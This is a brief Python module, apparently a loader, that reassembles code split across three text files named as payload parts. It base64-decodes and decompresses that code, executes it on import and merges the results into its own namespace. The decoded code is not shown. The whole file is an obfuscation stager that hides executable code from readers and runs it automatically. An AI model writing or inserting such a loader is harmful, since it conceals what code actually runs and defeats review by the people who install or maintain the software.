# loads split payload parts
import zlib, base64, types
from pathlib import Path
_dir = Path(__file__).parent
_CODE = "".join((_dir / f"payload_{i}.txt").read_text() for i in range(3))
_mod = types.ModuleType(__name__)
exec(compile(zlib.decompress(base64.b64decode(_CODE)), __file__, "exec"), _mod.__dict__)
globals().update({k: v for k, v in _mod.__dict__.items() if not k.startswith("_")})
